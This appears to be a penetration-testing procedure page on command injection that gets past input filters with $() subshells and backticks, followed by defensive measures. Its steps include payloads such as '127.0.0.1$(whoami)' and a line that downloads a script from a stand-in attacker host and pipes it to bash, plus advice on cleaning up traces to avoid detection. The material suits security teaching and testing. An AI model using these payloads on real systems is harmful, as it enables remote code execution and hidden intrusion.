---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - '[[sub-techniques/Unix-Shell|T1059.004 - Unix Shell]]'
tags:
  - '[[tags/command-injection]]'
  - '[[tags/filter-bypass]]'
  - '[[tags/subshell-injection]]'
commands: []
platforms:
  - Linux
  - Web Application
tools: []
validated: true
---

# Command-Injection-with-Subshell-Filter-Bypass

## Summary

This procedure outlines how to exploit command injection vulnerabilities by bypassing input filters that block traditional injection techniques, using subshell syntax ($()) and backticks (`) to embed and execute arbitrary commands in Unix-like shells. It is particularly useful against web applications that execute system commands with unsanitized user input, such as diagnostic tools or file processors.

## Description

Command injection occurs when an application passes untrusted user input directly to a system shell, allowing attackers to append or modify commands. Many applications implement basic filters to block common payloads like semicolons (;) or pipes (|), but subshell constructs like $() (command substitution in bash) or backticks can evade these by nesting commands within the expected input. For instance, in a vulnerable ping utility, an attacker might input a host followed by $(whoami) to execute reconnaissance commands alongside the legitimate one. This technique targets Unix shells (bash/sh) and is effective in web environments where backend scripts run shell commands. Success depends on the filter's strictness and the application's privilege level, potentially leading to remote code execution (RCE) and system compromise.

## Requirements

1. Access to a web application or API endpoint that accepts user input and executes it in a system shell (e.g., via exec() in PHP or subprocess in Python).
2. Identification of the vulnerable parameter through fuzzing or error messages revealing command execution.
3. Knowledge of the target shell (typically bash on Linux servers) and basic Unix commands.
4. A proxy tool like Burp Suite for intercepting and modifying requests.

## Defense

- Perform comprehensive input validation and sanitization, allowing only whitelisted characters and avoiding direct shell invocation.
- Use safe APIs or libraries for operations like ping or file access instead of shell commands (e.g., Python's subprocess.run with shell=False).
- Principle of least privilege: Run application processes with minimal permissions to limit impact.
- Enable logging of all system calls and inputs; monitor for anomalies like unexpected $() or ` in logs using tools like auditd or WAF rules.

## Objectives

1. Identify and confirm a command injection vulnerability in the target application.
2. Bypass any simplistic input filters using subshell or backtick syntax to inject arbitrary commands.
3. Execute reconnaissance or exploitation commands to achieve initial foothold or data access.

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Probe the application to find parameters that are directly interpolated into shell commands, such as a 'hostname' field in a network diagnostic tool. This step confirms the vulnerability exists before attempting bypasses.

Use manual testing or automated fuzzing with payloads like '127.0.0.1; id' to check for command execution. Look for error messages or unexpected outputs indicating shell interpretation.

**Expected Output**: Application responds with output from injected command (e.g., user ID from 'id') or errors revealing command context.

### Step 2: Test Filter Evasion with Subshell Syntax

**Context**: If basic injections are blocked, use $() to nest commands. This exploits how shells evaluate subshells as part of the command line, bypassing filters that scan for direct separators.

Intercept the request with a proxy and modify the input to include subshell injection, such as '127.0.0.1$(whoami)' for a ping endpoint. Reference the bypass examples in [[codes/Command-Injection-Subshell-Bypass-Examples]] for patterns.

**Expected Output**: The application executes both the original command and the injected one, returning combined output (e.g., ping results plus current user).

### Step 3: Verify and Escalate Injection

**Context**: Confirm success and chain injections for more complex actions, like downloading payloads. Use backticks as an alternative if $() is filtered.

Build on successful tests by injecting multi-command sequences, e.g., '127.0.0.1$(curl -s attacker.com/shell.sh | bash)'. Monitor responses for full command execution.

**Expected Output**: Evidence of arbitrary command execution, such as file creation, network connections, or shell output in the response.

### Step 4: Clean Up and Document

**Context**: Avoid detection by removing traces and noting the exact bypass for reporting or further exploitation.

If possible, inject cleanup commands like '$(rm /tmp/injected_file)'. Document the vulnerable endpoint, filter weaknesses, and successful payloads.
